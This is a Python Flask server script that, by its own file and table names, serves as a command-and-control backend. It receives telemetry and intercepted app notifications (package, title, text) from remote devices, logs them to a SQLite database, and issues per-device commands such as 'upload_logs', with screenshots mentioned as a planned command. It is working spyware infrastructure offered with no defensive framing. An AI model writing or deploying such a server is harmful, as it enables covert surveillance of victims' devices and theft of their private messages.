#!/usr/bin/env python3
from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import sqlite3
from threading import Lock

app = Flask(__name__)
db_lock = Lock()

def init_db():
    conn = sqlite3.connect('c2_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS telemetry
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  device_id TEXT,
                  data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS notifications
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  package TEXT,
                  title TEXT,
                  text TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    device_id = request.remote_addr  # simplistic, can be improved
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO telemetry (timestamp, device_id, data) VALUES (?, ?, ?)",
                  (datetime.utcnow().isoformat(), device_id, json.dumps(data)))
        conn.commit()
        conn.close()
    print(f"[+] Received telemetry from {device_id}")
    return jsonify({"status": "ok"}), 200

@app.route('/api/notification', methods=['POST'])
def notification():
    data = request.json
    with db_lock:
        conn = sqlite3.connect('c2_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO notifications (timestamp, package, title, text) VALUES (?, ?, ?, ?)",
                  (datetime.utcnow().isoformat(), data.get('package'), data.get('title'), data.get('text')))
        conn.commit()
        conn.close()
    print(f"[+] Notification from {data.get('package')}: {data.get('title')}")
    return jsonify({"status": "ok"}), 200

@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    # Placeholder: return command list (e.g., take screenshot, upload logs)
    commands = ["upload_logs"]
    return jsonify({"commands": commands})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
